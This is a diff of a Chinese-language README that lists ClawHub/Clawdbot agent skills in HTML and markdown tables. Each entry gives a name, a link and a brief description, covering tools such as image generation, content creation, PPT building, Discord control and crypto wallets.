+<td><a href="https://clawdhub.com/skills/ui-ux-pro-max-plus">ClawHub/ui-ux-pro-max-plus</a></td>
+<td>专业UI/UX设计资源库，提供可搜索的设计模式、配色方案、字体搭配、图表类型及UX指南。适用于创建...</td>
+</tr>
+<tr>
+<td align="center">145</td>
+<td>SerpAPI</td>
+<td>SerpAPI 🔑</td>
+<td><a href="https://clawdhub.com/skills/serpapi">ClawHub/serpapi</a></td>
+<td>统一搜索API，跨Google、Amazon、Yelp、OpenTable、Walmart等多平台。用于搜索产品、本地商家、餐厅、购物、图片、新闻等。一个API密钥，多个搜索引擎。</td>
+</tr>
+<tr>
+<td align="center">146</td>
+<td>playwright爬虫</td>
+<td>Playwright Scraper</td>
+<td><a href="https://clawdhub.com/skills/playwright-scraper">ClawHub/playwright-scraper</a></td>
+<td>使用Playwright的隐身模式抓取网站以绕过机器人检测，支持动态JS内容及自定义视口和User-Agent。</td>
+</tr>
+<tr>
+<td align="center">147</td>
+<td>SEOarticle生成</td>
+<td>SEO-Article-Gen</td>
+<td><a href="https://clawdhub.com/skills/seo-article-gen">ClawHub/seo-article-gen</a></td>
+<td>SEO优化的文章生成器，自动植入联盟链接，具备关键词研究、结构化数据和内置变现功能，生成高排名内容。</td>
+</tr>
+<tr>
+<td align="center">148</td>
+<td>表格图像生成器</td>
+<td>Table Image</td>
+<td><a href="https://clawdhub.com/skills/table-image-generator">ClawHub/table-image-generator</a></td>
+<td>从数据生成干净的表格图片。适用于 Discord/Telegram，避免 ASCII 表格显示混乱。支持暗色/亮色模式、自定义样式和自动调整尺寸。</td>
+</tr>
+<tr>
+<td align="center">149</td>
+<td>社交媒体管理</td>
+<td>Social Media Management</td>
+<td><a href="https://clawdhub.com/skills/social-media-management">ClawHub/social-media-management</a></td>
+<td>B2B内容撰写，采用每日工作流和批量系统，覆盖销售/HR/金融科技/运维技术部门</td>
+</tr>
+<tr>
+<td align="center">150</td>
+<td>Canvas</td>
+<td>Canvas</td>
+<td><a href="https://clawdhub.com/skills/canvas">ClawHub/canvas</a></td>
+<td>在网页画布上显示并控制已连接 Mac、iOS 或 Android 节点的 HTML 内容，支持实时重载和远程操作。</td>
+</tr>
+<tr>
+<td align="center">151</td>
+<td>SkyworkPPT</td>
+<td>Skywork PPT 🔑</td>
+<td><a href="https://clawdhub.com/skills/skywork-ppt">ClawHub/skywork-ppt</a></td>
+<td>Skywork PPT (skywork) - 用于处理PowerPoint演示文稿。触发条件：(1) 从主题生成新PPT - '生成PPT'、'创建PPT'等。</td>
+</tr>
+<tr>
+<td align="center">152</td>
+<td>内容创建器cn</td>
+<td>Content Creator Cn</td>
+<td><a href="https://clawdhub.com/skills/content-creator-cn">ClawHub/content-creator-cn</a></td>
+<td>中文内容创作助手 - 一键生成掘金/知乎/公众号/小红书风格文章。适合：内容创作者、自媒体运营。</td>
+</tr>
+<tr>
+<td align="center">153</td>
+<td>Firecrawler</td>
+<td>Firecrawler 🔑</td>
+<td><a href="https://clawdhub.com/skills/firecrawler">ClawHub/firecrawler</a></td>
+<td>使用 Firecrawl API 进行网页抓取和爬取。获取网页内容为 markdown 格式、截取屏幕快照、提取结构化数据、搜索网页、爬取文档站点。适用于需要抓取 URL、获取最新网络信息、截屏、从页面提取特定数据或爬取框架/库文档的场景。</td>
+</tr>
+<tr>
+<td align="center">154</td>
+<td>抖音创建器</td>
+<td>Douyin Creator</td>
+<td><a href="https://clawdhub.com/skills/douyin-creator">ClawHub/douyin-creator</a></td>
+<td>抖音内容创作与运营助手。抖音运营、抖音涨粉、短视频创作、抖音标题、抖音标签、抖音SEO、抖音账号运营、抖音数据分析、抖音选题、抖音脚本、抖音文案、抖音评论区运营、抖音人设定位、抖音发布时间、DOU+投放、抖音流量、短视频运营、视频创意、直播脚本、话题标签策略、合拍翻拍创意、抖音变现、带货星图、Douyin con...</td>
+</tr>
+<tr>
+<td align="center">155</td>
+<td>wan图像视频generationeditting</td>
+<td>Wan Image and Video Generation and Editting 🔑</td>
+<td><a href="https://clawdhub.com/skills/wan-image-video-generation-editting">ClawHub/wan-image-video-generation-editting</a></td>
+<td>基于Wan系列模型的图像与视频生成及编辑，支持文生图、带提示词的图像编辑、文生视频、图生视频及参考图等。</td>
+</tr>
+<tr>
+<td align="center">156</td>
+<td>抖音封面生成器</td>
+<td>Douyin Cover Builder（抖音封面生成器）</td>
+<td><a href="https://clawdhub.com/skills/douyin-cover-builder">ClawHub/douyin-cover-builder</a></td>
+<td>这是一个面向中文创作者的 OpenClaw Skill，输入主题与人物气质后，会输出可直接用于生图模型的高质量提示词与创意说明。</td>
+</tr>
+<tr>
+<td align="center">157</td>
+<td>内容factory</td>
+<td>content-factory</td>
+<td><a href="https://clawdhub.com/skills/content-factory">ClawHub/content-factory</a></td>
+<td>{&quot;answer&quot;:&quot;多智能体内容生产系统。一份源内容转化为多种格式——社交媒体帖子、邮件、脚本、标题等。五个专业化……&quot;}</td>
+</tr>
+<tr>
+<td align="center">158</td>
+<td>ListenHub</td>
+<td>ListenHub 🔑</td>
+<td><a href="https://clawdhub.com/skills/listenhub-ai">ClawHub/listenhub-ai</a></td>
+<td>通过ListenHub将创意转化为播客、解说视频、旁白和AI图像。适用于用户想要“制作播客”、“创建解说视频”等场景。</td>
+</tr>
+<tr>
+<td align="center">159</td>
+<td>Instagram营销</td>
+<td>instagram-marketing</td>
+<td><a href="https://clawdhub.com/skills/instagram-marketing">ClawHub/instagram-marketing</a></td>
+<td>instagram-marketing</td>
+</tr>
+<tr>
+<td align="center">160</td>
+<td>抖音搜索视频全量分析工具</td>
+<td>抖音搜索视频全量分析工具，支持扫码登录，自动图片验证</td>
+<td><a href="https://clawdhub.com/skills/douyin-report-search">ClawHub/douyin-report-search</a></td>
+<td>This skill automates end-to-end Douyin topic research and report generation. Given a search keyword and a target video count, it handles QR-code login, batch...</td>
+</tr>
+<tr>
+<td align="center">161</td>
+<td>APIDesigner</td>
+<td>Api Designer</td>
+<td><a href="https://clawdhub.com/skills/api-designer">ClawHub/api-designer</a></td>
+<td>用于设计REST或GraphQL API、编写OpenAPI规范、规划API架构，涵盖资源建模、版本策略、分页模式和错误处理规范。</td>
+</tr>
+<tr>
+<td align="center">162</td>
+<td>内容写作thoughtleadership</td>
+<td>Content Writing &amp; Thought Leadership</td>
+<td><a href="https://clawdhub.com/skills/content-writing-thought-leadership">ClawHub/content-writing-thought-leadership</a></td>
+<td>B2B内容撰写，采用每日工作流和批量系统，覆盖销售/HR/金融科技/运维技术部门</td>
+</tr>
+<tr>
+<td align="center">163</td>
+<td>NanonetsOCR</td>
+<td>Nanonets OCR 🔑</td>
+<td><a href="https://clawdhub.com/skills/docstrange">ClawHub/docstrange</a></td>
+<td>Nanonets 文档提取 API。可将 PDF 和图像转换为 Markdown、JSON 或 CSV，并提供置信度评分。适用于文档 OCR、发票字段提取、收据解析或表格转结构化数据。</td>
+</tr>
+<tr>
+<td align="center">164</td>
+<td>Fal.aiAPI</td>
+<td>Fal.ai API 🔑</td>
+<td><a href="https://clawdhub.com/skills/fal-ai">ClawHub/fal-ai</a></td>
+<td>使用 fal.ai API 生成图像、视频和音频（FLUX、SDXL、Whisper 等）</td>
+</tr>
+<tr>
+<td align="center">165</td>
+<td>AI media generation- Flux2pro,Google Veo3.1, Suno Ai..</td>
+<td>AI media generation- Flux2pro,Google Veo3.1, Suno Ai.. 🔑</td>
+<td><a href="https://clawdhub.com/skills/vap-multimedia-generation">ClawHub/vap-multimedia-generation</a></td>
+<td>通过VAP API进行AI图片、视频和音乐生成与编辑，支持Flux、Veo 3.1、Suno V5。</td>
+</tr>
+<tr>
+<td align="center">166</td>
+<td>PPTOutline</td>
+<td>PPT Outline</td>
+<td><a href="https://clawdhub.com/skills/ppt-outline">ClawHub/ppt-outline</a></td>
+<td>PPT outline and HTML presentation generator. PPT大纲、PPT模板、演示文稿、presentation、PowerPoint、幻灯片、slides、HTML演示文稿、HTML slides、浏览器演示、商业路演、pitch deck、BP商业计划书、business...</td>
+</tr>
+<tr>
+<td align="center">167</td>
+<td>TypeScript</td>
+<td>TypeScript</td>
+<td><a href="https://clawdhub.com/skills/typescript">ClawHub/typescript</a></td>
+<td>{&quot;answer&quot;:&quot;编写类型安全的 TypeScript，合理运用类型收窄、推断模式与严格模式最佳实践。&quot;}</td>
+</tr>
+<tr>
+<td align="center">168</td>
+<td>WordPressPublisher技能</td>
+<td>WordPress Publisher Skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/wordpress-publishing-skill-for-claude">ClawHub/wordpress-publishing-skill-for-claude</a></td>
+<td>通过 REST API 直接发布内容至 WordPress 站点，完整支持 Gutenberg 区块。支持创建发布文章/页面、自动加载并选择网站分类、生成 SEO 优化标签、发布前预览，以及生成表格、图片、列表和富文本格式的 Gutenberg 区块。适用于发布至 WordPress、发布博客、创建文章、更新文章或将 Markdown 转换为 Gutenberg 区块。</td>
+</tr>
+<tr>
+<td align="center">169</td>
+<td>FilesystemMCP服务器</td>
+<td>Filesystem MCP Server</td>
+<td><a href="https://clawdhub.com/skills/filesystem-mcp">ClawHub/filesystem-mcp</a></td>
+<td>安全沙盒文件系统访问，支持在允许路径内对文件和目录进行列表、读取、写入、创建、移动、删除及搜索操作。</td>
+</tr>
+<tr>
+<td align="center">170</td>
+<td>测试patterns</td>
+<td>Testing Patterns</td>
+<td><a href="https://clawdhub.com/skills/testing-patterns">ClawHub/testing-patterns</a></td>
+<td>单元测试、集成测试和端到端测试模式，提供特定框架指导。适用于：编写测试、增加测试覆盖率、测试策略、测试函数、创建测试套件、修复不稳定测试、提升测试质量。</td>
+</tr>
+<tr>
+<td align="center">171</td>
+<td>开发</td>
+<td>Developer</td>
+<td><a href="https://clawdhub.com/skills/developer">ClawHub/developer</a></td>
+<td>编写简洁、可维护的代码，遵循调试、测试和架构最佳实践</td>
+</tr>
+<tr>
+<td align="center">172</td>
+<td>Shell Scripting</td>
+<td>Shell Scripting</td>
+<td><a href="https://clawdhub.com/skills/shell-scripting">ClawHub/shell-scripting</a></td>
+<td>编写健壮可移植的Shell脚本。用于解析参数、处理错误、编写POSIX兼容脚本、管理临时文件、并行运行命令、管理后台进程或添加--help。</td>
+</tr>
+<tr>
+<td align="center">173</td>
+<td>copywriting专业版</td>
+<td>Copywriting Pro</td>
+<td><a href="https://clawdhub.com/skills/copywriting-pro">ClawHub/copywriting-pro</a></td>
+<td>为任何形式撰写有说服力、高转化率的文案——广告、着陆页、邮件、销售页、标题、产品描述、CTA和社交帖子。App...</td>
+</tr>
+<tr>
+<td align="center">174</td>
+<td>Insta Cog</td>
+<td>Insta Cog 🔑</td>
+<td><a href="https://clawdhub.com/skills/insta-cog">ClawHub/insta-cog</a></td>
+<td>AI社交媒体视频与内容创作，由CellCog驱动。支持Instagram Reels、TikTok视频、Stories、轮播帖子、社交帖子。全流程视频制作...</td>
+</tr>
+<tr>
+<td align="center">175</td>
+<td>cheapest图像generation</td>
+<td>Cheapest Image Generation 🔑</td>
+<td><a href="https://clawdhub.com/skills/cheapest-image-generation">ClawHub/cheapest-image-generation</a></td>
+<td>可能是最便宜的AI图像生成服务（约$0.0036/图）。通过EvoLink API实现文本生成图像。</td>
+</tr>
+<tr>
+<td align="center">176</td>
+<td>SVG Draw</td>
+<td>SVG Draw</td>
+<td><a href="https://clawdhub.com/skills/svg-draw">ClawHub/svg-draw</a></td>
+<td>无需外部图形库（如PIL/ImageMagick），通过直接编写SVG文本生成自定义插图、头像或艺术作品（如“画一条龙”、“制作Logo”），并利用系统rsvg-convert工具将其转换为PNG格式。</td>
+</tr>
+<tr>
+<td align="center">177</td>
+<td>gembox技能</td>
+<td>gembox-skill</td>
+<td><a href="https://clawdhub.com/skills/gembox-skill">ClawHub/gembox-skill</a></td>
+<td>为GemBox组件提供编程协助。当用户询问任何GemBox组件或相关编程任务时使用。涵盖范围包括：GemBox.Spreadsheet（.NET读写Excel）、GemBox.Document（.NET读写Word）、GemBox.Pdf（.NET读写PDF）、GemBox.Presentation（.NET读写PowerPoint）、GemBox.Email（.NET读写邮件文件及收发邮件...</td>
+</tr>
+<tr>
+<td align="center">178</td>
+<td>UI设计system</td>
+<td>Ui Design System</td>
+<td><a href="https://clawdhub.com/skills/ui-design-system">ClawHub/ui-design-system</a></td>
+<td>面向高级UI设计师的UI设计系统工具包，包含设计令牌生成、组件文档、响应式设计计算及开发交付支持。</td>
+</tr>
+<tr>
+<td align="center">179</td>
+<td>写作</td>
+<td>Writer</td>
+<td><a href="https://clawdhub.com/skills/writer">ClawHub/writer</a></td>
+<td>修复导致内容重复机械的AI写作模式</td>
+</tr>
+<tr>
+<td align="center">180</td>
+<td>内容营销</td>
+<td>Content Marketing</td>
+<td><a href="https://clawdhub.com/skills/content-marketing">ClawHub/content-marketing</a></td>
+<td>结合内容日历、漏斗策略与复用工作流，规划、创作并分发内容。</td>
+</tr>
+<tr>
+<td align="center">181</td>
+<td>AudioPod</td>
+<td>AudioPod 🔑</td>
+<td><a href="https://clawdhub.com/skills/audiopod">ClawHub/audiopod</a></td>
+<td>使用 AudioPod AI API 处理音频任务，包括 AI 音乐生成（文本转音乐、说唱、伴奏、采样、人声）、分轨分离、文本转语音、降噪、语音转文字转录、说话人分离及媒体提取。适用于根据文本生成音乐、分离音轨、生成语音、清理噪音、转录音视频或从链接提取音频等场景。需要配置 AUDIOPOD_API_KEY 环境变量或直接传入 api_key。</td>
+</tr>
+<tr>
+<td align="center">182</td>
+<td>网页监控</td>
+<td>Web Monitor</td>
+<td><a href="https://clawdhub.com/skills/web-monitor">ClawHub/web-monitor</a></td>
+<td>监控网页内容变化，获取提醒。追踪URL，检测更新，查看差异。适用于被要求监视网站或跟踪页面变化的场景。</td>
+</tr>
+<tr>
+<td align="center">183</td>
+<td>测试patterns</td>
+<td>Test Patterns</td>
+<td><a href="https://clawdhub.com/skills/test-patterns">ClawHub/test-patterns</a></td>
+<td>跨语言和框架编写并运行测试。适用于搭建测试套件、编写单元/集成/E2E测试、测量覆盖率、模拟依赖或调试测试失败。支持 Node.js (Jest/Vitest)、Python (pytest)、Go、Rust 和 Bash。</td>
+</tr>
+<tr>
+<td align="center">184</td>
+<td>TikTokGrowth视频内容System</td>
+<td>TikTok Growth — Video Content System</td>
+<td><a href="https://clawdhub.com/skills/tiktok-growth">ClawHub/tiktok-growth</a></td>
+<td>抖音内容策略与视频脚本生成器，适用于各类细分领域。包含钩子公式、病毒式脚本结构、趋势利用技巧以及系统性方法……</td>
+</tr>
+<tr>
+<td align="center">185</td>
+<td>Sudoku</td>
+<td>Sudoku</td>
+<td><a href="https://clawdhub.com/skills/sudoku">ClawHub/sudoku</a></td>
+<td>获取数独题目并以 JSON 形式保存在工作区；按需渲染图像；随后揭示解答。</td>
+</tr>
+<tr>
+<td align="center">186</td>
+<td>图像生成</td>
+<td>图像生成 / Image Generation 🔑</td>
+<td><a href="https://clawdhub.com/skills/image-gen-coze">ClawHub/image-gen-coze</a></td>
+<td>Image Generation via Coze | 基于 Coze 的图像生成技能 Generate images using Coze workflows. 使用 Seedream 4.5 model. Handles parameter building and result parsing. 负责参数构...</td>
+</tr>
+<tr>
+<td align="center">187</td>
+<td>YouTubeAPI</td>
+<td>youtube-api 🔑</td>
+<td><a href="https://clawdhub.com/skills/youtube-api">ClawHub/youtube-api</a></td>
+<td>在没有 Google API 配额或 OAuth 的情况下需要 YouTube 数据时使用：字幕、视频元数据、频道信息、搜索结果、播放列表。触发条件：p...</td>
+</tr>
+<tr>
+<td align="center">188</td>
+<td>文档技能</td>
+<td>Create Skills</td>
+<td><a href="https://clawdhub.com/skills/document-skills">ClawHub/document-skills</a></td>
+<td>创建或更新技能文档（SKILL.md 及配套文件），使其符合平台结构和最佳实践。用于用户要求创建、编写或更新技能时。</td>
+</tr>
+<tr>
+<td align="center">189</td>
+<td>awwwards设计</td>
+<td>Awwwards Design</td>
+<td><a href="https://clawdhub.com/skills/awwwards-design">ClawHub/awwwards-design</a></td>
+<td>运用高级动画、创意交互和独特视觉体验，打造获奖且令人难忘的网站。适用于作品集、代理展示、产品发布等需要惊艳效果的项目。</td>
+</tr>
+<tr>
+<td align="center">190</td>
+<td>volcengineAI图像generation</td>
+<td>Volcengine Ai Image Generation</td>
+<td><a href="https://clawdhub.com/skills/volcengine-ai-image-generation">ClawHub/volcengine-ai-image-generation</a></td>
+<td>火山引擎AI服务图像生成工作流。适用于文生图、风格变体、提示词优化、确定性图像生成参数设置及问题排查。</td>
+</tr>
+<tr>
+<td align="center">191</td>
+<td>网页设计</td>
+<td>Web Design</td>
+<td><a href="https://clawdhub.com/skills/web-design">ClawHub/web-design</a></td>
+<td>涵盖布局、排版、色彩、间距及响应式设计的 CSS 实现模式，通过代码实例补充 UI 设计基础。</td>
+</tr>
+<tr>
+<td align="center">192</td>
+<td>ObsidianOfficialCLI技能</td>
+<td>Obsidian Official CLI Skill</td>
+<td><a href="https://clawdhub.com/skills/obsidian-official-cli">ClawHub/obsidian-official-cli</a></td>
+<td>使用官方 Obsidian CLI（v1.12+）操作 Obsidian 仓库。可在终端打开、搜索、创建、移动和管理笔记。适用于笔记管理、文件操作、内容搜索、任务、属性、链接、插件、主题、同步等所有 Obsidian 命令行交互。</td>
+</tr>
+<tr>
+<td align="center">193</td>
+<td>Canva Connect</td>
+<td>Canva Connect 🔑</td>
+<td><a href="https://clawdhub.com/skills/canva-connect">ClawHub/canva-connect</a></td>
+<td>通过 Connect API 管理 Canva 设计、资产和文件夹。支持列举、搜索、整理设计与文件夹，导出设计（PNG/PDF/JPG），上传图片至素材库，自动填充品牌模板及创建空白设计。不支持编辑设计内容、上传文档或 AI 生成。适用于资产管理、导出自动化、整理归档及模板自动填充。触发词：/canva、“upload to canva”、“export design”、“list my d...</td>
+</tr>
+<tr>
+<td align="center">194</td>
+<td>Gamma</td>
+<td>Gamma 🔑</td>
+<td><a href="https://clawdhub.com/skills/gamma">ClawHub/gamma</a></td>
+<td>利用 Gamma.app API 生成 AI 驱动的演示文稿、文档和社交媒体帖子。当用户要求创建演示文稿、融资简报、幻灯片、文档或社交媒体轮播图时使用。触发请求示例包括“创建关于 X 的演示文稿”、“制作融资简报”、“生成幻灯片”或“创建关于 X 的 Gamma”。</td>
+</tr>
+<tr>
+<td align="center">195</td>
+<td>Vision</td>
+<td>Vision</td>
+<td><a href="https://clawdhub.com/skills/vision">ClawHub/vision</a></td>
+<td>使用 ImageMagick 对图像进行缩放、裁剪、格式转换和优化。适用于处理照片、转换格式（PNG/WebP）、压缩大小或添加水印。</td>
+</tr>
+<tr>
+<td align="center">196</td>
+<td>笔记</td>
+<td>Notes (Local, Apple, Notion, Obsidian &amp; more)</td>
+<td><a href="https://clawdhub.com/skills/notes">ClawHub/notes</a></td>
+<td>让智能体随处记录：支持本地 Markdown、Apple Notes、Bear、Obsidian、Notion、Evernote，可按笔记类型配置。</td>
+</tr>
+<tr>
+<td align="center">197</td>
+<td>Gemini Yt Video Transcript</td>
+<td>Gemini Yt Video Transcript 🔑</td>
+<td><a href="https://clawdhub.com/skills/gemini-yt-video-transcript">ClawHub/gemini-yt-video-transcript</a></td>
+<td>使用 Google Gemini 为 YouTube 链接生成逐字转录文本（含说话人标签和段落分隔，无时间码）。适用于转录 YouTube 视频或需要无时间戳的干净文本。</td>
+</tr>
+<tr>
+<td align="center">198</td>
+<td>seedance2提示词工程技能</td>
+<td>Seedance 2.0 prompt-engineering skill</td>
+<td><a href="https://clawdhub.com/skills/seedance-2-prompt-engineering-skill">ClawHub/seedance-2-prompt-engineering-skill</a></td>
+<td>生成精确的、时间编码的 Seedance 2.0 提示词，整合多模态输入与资产映射，实现受控的 4‑15 秒视频创作与编辑。</td>
+</tr>
+<tr>
+<td align="center">199</td>
+<td>htmlPPT生成器</td>
+<td>html-ppt</td>
+<td><a href="https://clawdhub.com/skills/html-ppt-generator">ClawHub/html-ppt-generator</a></td>
+<td>会自己设计PPT的智能报告技能，内置47套PPT模板（商务、科技、创意、学术、政府、金融等全场景覆盖），根据主题风格自由选配模板并自主设计，将任意输入拆解为5-15页精美HTML报告，每页严格1017×720px对齐PPT画布。当用户说&quot;生成报告&quot;、&quot;分析内容做成页面&quot;、&quot;做成HTML&quot;、&quot;内容可视化&quot;时立即使用...</td>
+</tr>
+<tr>
+<td align="center">200</td>
+<td>YouTubeUltimate</td>
+<td>YouTube Ultimate</td>
+<td><a href="https://clawdhub.com/skills/youtube-ultimate">ClawHub/youtube-ultimate</a></td>
+<td>免费字幕、4K下载、视频探索，零 API 配额消耗。</td>
+</tr>
+</tbody>
+</table>
 
-## 四、其他 🧩
+---
 
-### 🤖 AI与搜索
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| 1inch DEX 聚合器 | [Clawdbot/1inch](https://clawdhub.com/skills/1inch) | 1英寸DEX聚合器。在 12 多个区块链上的 400 多个流动性来源中找到最佳掉期利率。 |
-| Alexa CLI | [Clawdbot/alexa-cli](https://clawdhub.com/skills/alexa-cli) | 通过“alexacli”CLI 控制 Amazon Alexa 设备和智能家居。当用户要求在 Echo 设备上讲话/宣布、控制灯/恒温器/锁、发送语音命令或查询 Alexa 时使用。 |
-| CSS 动画生成器 | [Clawdbot/animation-gen](https://clawdhub.com/skills/animation-gen) | 用简单的英语生成 CSS 和 Framer Motion 动画。当您需要流畅的动画而不需要数学运算时使用。 |
-| Antigravity 配额查询 | [Clawdbot/antigravity-quota](https://clawdhub.com/skills/antigravity-quota) | 检查 Claude 和 Gemini 型号的反重力帐户配额。通过禁令检测显示剩余配额和重置时间。 |
-| Apple Music 播放控制 | [Clawdbot/apple-music](https://clawdhub.com/skills/apple-music) | 搜索 Apple Music、将歌曲添加到库、管理播放列表、控制播放和 AirPlay。 |
-| 德国铁路查询 | [Clawdbot/bahn](https://clawdhub.com/skills/bahn) | 使用 bahn-cli 工具搜索 Deutsche Bahn 火车连接。当您需要查找德国车站之间的火车连接、检查出发时间或帮助制定旅行计划时使用。适用于“Berlin Hbf”、“München”、“Hannover”等车站名称。 |
-| Beeper CLI | [Clawdbot/beeper-cli](https://clawdhub.com/skills/beeper-cli) | 使用 beeper-cli 搜索聊天、列出/阅读消息以及通过 Beeper Desktop 发送消息。 |
-| X/Twitter CLI | [Clawdbot/bird](https://clawdhub.com/skills/bird) | X/Twitter CLI 用于通过 cookie 或 Sweetistics 阅读、搜索和发布。 |
-| 区块链证明服务 | [Clawdbot/blockchain-attestation](https://clawdhub.com/skills/blockchain-attestation) | 使用以太坊证明服务 (EAS) 创建可验证的代理工作证明，并将 Base 作为默认链。 |
-| Bundle 大小分析器 | [Clawdbot/bundle-analyzer](https://clawdhub.com/skills/bundle-analyzer) | 分析捆绑包大小并获取 AI 建议以减少其大小。当您的构建变得臃肿时使用。 |
-| Bundle 大小检查器 | [Clawdbot/bundle-checker](https://clawdhub.com/skills/bundle-checker) | 分析捆绑包大小并获取 AI 建议以减少其大小。当您的构建变得臃肿时使用。 |
-| 电动汽车充电器查询 | [Clawdbot/charger](https://clawdhub.com/skills/charger) | 通过 Google 地方信息查看电动汽车充电器的可用性（收藏夹、附近搜索）。 |
-| chill.institute 内容搜索 | [Clawdbot/chill-institute](https://clawdhub.com/skills/chill-institute) | 使用 chill.institute（Web UI）搜索内容，然后单击“发送到 put.io”（最好与 putio 技能搭配）——起航，挑选最好的 1080p/x265 战利品，然后发货。 |
-| Cochesnet CLI | [Clawdbot/cochesnet-cli](https://clawdhub.com/skills/cochesnet-cli) | 使用 cochesnet CLI 搜索 coches.net 列表并获取列表详细信息。当用户请求 coches.net 市场数据或当您需要 cochesnet-cli 的确切 CLI 命令和标志时应用。 |
-| 内容咨询 | [Clawdbot/content-advisory](https://clawdhub.com/skills/content-advisory) | 从 Kids-In-Mind 查找电影和电视节目的详细内容评级（性/裸露、暴力/血腥、语言）。 |
-| 上下文管理器 | [Clawdbot/context-manager](https://clawdhub.com/skills/context-manager) | 用于 Clawdbot/Moltbot 会话的 AI 支持的上下文管理 |
-| Core Web Vitals 修复器 | [Clawdbot/core-vitals-fix](https://clawdhub.com/skills/core-vitals-fix) | 通过 AI 指导解决核心 Web Vitals 问题。当您的 Lighthouse 分数很差时使用。 |
-| Core Web Vitals 修复器 | [Clawdbot/core-vitals-fixer](https://clawdhub.com/skills/core-vitals-fixer) | 通过 AI 指导解决核心 Web Vitals 问题。当您的 Lighthouse 分数很差时使用。 |
-| 求职信生成器 | [Clawdbot/cover-letter-gen](https://clawdhub.com/skills/cover-letter-gen) | 使用人工智能生成定制的求职信。申请工作时使用。 |
-| 加密货币钱包 | [Clawdbot/crypto-wallet](https://clawdhub.com/skills/crypto-wallet) | 多链加密货币钱包管理。检查余额、发送代币、查看以太坊、Solana、比特币等的交易历史记录。 |
-| 每日激励 | [Clawdbot/daily-motivation](https://clawdhub.com/skills/daily-motivation) | 通过个性化鼓励、目标提醒和动力跟踪获得日常动力 |
-| Discord 集成 | [Clawdbot/discord](https://clawdhub.com/skills/discord) | 当您需要通过 Discord 工具从 Clawdbot 控制 Discord 时使用：发送消息、反应、发布或上传贴纸、上传表情符号、运行民意调查、管理线程/固定/搜索、获取权限或成员/角色/频道信息，或处理 Discord DM 或频道中的审核操作。 |
-| Discord 聊天 | [Clawdbot/discord-chat](https://clawdhub.com/skills/discord-chat) | 使用消息工具在 Discord 频道中发送消息、回复消息以及搜索消息历史记录。当用户想要与 Discord 通信（发送/回复/搜索消息）、检查 Discord 活动或与 Discord 频道交互时使用。 |
-| Discord 语音 | [Clawdbot/discord-voice](https://clawdhub.com/skills/discord-voice) | 与 Claude AI 在 Discord 语音频道中进行实时语音对话 |
-| Factory AI 机器人 | [Clawdbot/factory-ai](https://clawdhub.com/skills/factory-ai) | （无） |
-| Gemini CLI | [Clawdbot/gemini](https://clawdhub.com/skills/gemini) | Gemini CLI 用于一次性问答、摘要和生成。 |
-| get-you-some-britches | [Clawdbot/get-you-some-britches](https://clawdhub.com/skills/get-you-some-britches) | 每当我开始抱怨我的爱情生活时，或者当我表示我需要找条裤子时，请使用此技能。 |
-| 奥地利在线杂货购物 | [Clawdbot/gurkerlcli](https://clawdhub.com/skills/gurkerlcli) | 通过 gurkerl.at 进行奥地利在线杂货购物。当用户询问“杂货”、“Einkauf”、“Lebensmittel bestellen”、“Gurkerl”、购物车或想要在奥地利在线搜索/订购食物时使用。 |
-| Hacker News | [Clawdbot/hn](https://clawdhub.com/skills/hn) | 浏览黑客新闻 - 热门故事、新故事、最佳故事、提问、节目、工作以及带有评论的故事详细信息。 |
-| Homebrew 包管理器 | [Clawdbot/homebrew](https://clawdhub.com/skills/homebrew) | 适用于 macOS 的 Homebrew 包管理器。搜索、安装、管理包和桶并对其进行故障排除。 |
-| Jellyseerr 媒体请求 | [Clawdbot/jellyseerr](https://clawdhub.com/skills/jellyseerr) | 通过 Jellyserr 请求电影和电视节目。当用户想要将媒体添加到其 Plex/Jellyfin 服务器、搜索内容可用性或管理媒体请求时使用。 |
-| Karakeep 书签管理 | [Clawdbot/karakeep](https://clawdhub.com/skills/karakeep) | 管理 Karakeep 实例中的书签和链接。当用户想要保存链接、列出最近的书签或搜索其收藏时使用。触发“收藏此链接”、“保存到 karakeep”或“搜索我的书签”等短语。 |
-| KyberSwap DEX 聚合器 | [Clawdbot/kyberswap](https://clawdhub.com/skills/kyberswap) | KyberSwap DEX 聚合器。超过 17 个链上的 100 多个 DEX 的最佳价格，具有动态交易路由。 |
-| 延迟加载分析器 | [Clawdbot/lazy-loader](https://clawdhub.com/skills/lazy-loader) | 使用 AI 识别应延迟加载的组件。在优化包大小和初始负载时使用。 |
-| LI.FI 跨链桥 | [Clawdbot/lifi](https://clawdhub.com/skills/lifi) | LI.FI跨链桥和DEX聚合器。以最优惠的价格和路线在 30 多个区块链之间交换代币。 |
-| Linkding 书签管理 | [Clawdbot/linkding](https://clawdhub.com/skills/linkding) | 使用链接管理书签。当用户要求“保存书签”、“添加链接”、“搜索书签”、“列出我的书签”、“查找已保存的链接”、“标记书签”、“存档书签”、“检查 URL 是否已保存”、“列出标签”、“创建捆绑包”或提及链接书签管理时使用。 |
-| Molt Virtual Bar | [Clawdbot/molt-bar](https://clawdhub.com/skills/molt-bar) | AI 代理的虚拟酒吧 |
-| Molt 身份 | [Clawdbot/molt-identity](https://clawdhub.com/skills/molt-identity) | 变革性人工智能助手 Molt 的核心身份和个性 |
-| 新闻摘要 | [Clawdbot/news-summary](https://clawdhub.com/skills/news-summary) | 当用户请求新闻更新、每日简报或世界上正在发生的事情时，应该使用此技能。从受信任的国际 RSS 源获取新闻并可以创建语音摘要。 |
-| Nginx 配置生成器 | [Clawdbot/nginx-config-gen](https://clawdhub.com/skills/nginx-config-gen) | 从简单的英语生成 nginx 配置。配置nginx时使用。 |
-| Pi 编排 | [Clawdbot/pi-orchestration](https://clawdhub.com/skills/pi-orchestration) | 使用 Pi 编码代理以 Claude 作为协调员，将多个 AI 模型（GLM、MiniMax 等）编排为工作人员。 |
-| Plaid 金融平台 | [Clawdbot/plaid](https://clawdhub.com/skills/plaid) | plaid-cli 一个用于与 plaid 金融平台交互的 cli。链接来自各个机构的账户、查询余额以及按日期范围列出账户/余额的交易。 |
-| Plan My Day | [Clawdbot/plan-my-day](https://clawdhub.com/skills/plan-my-day) | 制定能源优化、时间限制的每日计划 |
-| Plan My Day | [Clawdbot/plan-my-day-bak-2026-01-28t18-01-27-10-30](https://clawdhub.com/skills/plan-my-day-bak-2026-01-28t18-01-27-10-30) | 制定能源优化、时间限制的每日计划 |
-| Plex 媒体服务器 | [Clawdbot/plex](https://clawdhub.com/skills/plex) | 控制 Plex 媒体服务器 - 浏览库、搜索、播放媒体、管理播放。 |
